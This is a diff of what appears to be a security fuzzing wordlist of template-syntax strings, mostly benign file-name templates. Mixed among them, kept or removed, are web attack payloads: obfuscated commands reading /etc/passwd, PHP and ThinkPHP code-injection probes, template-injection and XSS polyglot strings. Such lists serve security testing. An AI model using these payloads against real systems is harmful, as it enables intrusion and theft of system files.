@@ -328,20 +328,16 @@ application-${modulename}.xml.ftl.2.tmp
 application-${modulename}.xml.ftl.svn-base
 application-${modulename}.xml.ftl.tmp
 arraylength=${#paramsarray[*]}
-bin/wcm/contentfinder/connector/suggestions.json;%0aojh.css?query_term=path%3a/&pre={{randstr}}
 blog/*/{{ad_click_url}}
 cat ${home:0:1}etc${home:0:1}passwd
-cat$ifs$9${pwd%%[a-z]*}e*c${pwd%%[a-z]*}p?ss??
 char1=`echo "${uriinputdecode:(i+4):1}"`
 char2=`echo "${uriinputdecode:(i+5):1}"`
 char=`echo "${input:i:1}"`
 char=`echo "${uriinputdecode:i:1}"`
 char=`echo "${uriinputencode:i:1}"`
-charts/wizard/url.php?${phpinfo()}=1
 code: {{.ecode}}
 codegenerator-boss/template/springmvc_rest/web/pages/${classnamelowercase}/show.jsp
 confirm`1`; var something = `abc${confirm(1)}def`; ``.constructor.constructor`confirm\`1\````;
-dashboard/snapshot/%7b%7bconstructor.constructor(%27alert(document.domain)%27)()%7d%7d?orgid=1
 en-gb.com_{{name}}.ini
 en-gb.com_{{name}}.sys.ini
 en-gb.{{extension.element.lower}}.core.ini
@@ -362,8 +358,6 @@ if [ true = "$z" ] ; then echo "debug! paramsarray at y: " ${paramsarray[$y]};fi
 if [ true = "$z" ] ; then echo "debug! paramsarray: "${paramsarray[*]}; fi
 index.php/module/action/param1/${@die(md5(hellothinkphp))}
 index.php?s=/module/action/param1/${@die(md5(hellothinkphp))}
-infusions/downloads/downloads.php?cat_id=${system(cat /etc/passwd)}
-infusions/downloads/downloads.php?cat_id=${system(ls)}
 intext:{{szerrortip}} inurl:/doc/page/login.asp
 itm/*/%7b%7b
 javascript://%250aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></title/</style/</script/</textarea/</iframe/</noscript>\74k<k/contenteditable/autofocus/onfocus=/*${/*/;{/**/(alert)(1)}//><base/href=//x55.is\76-->
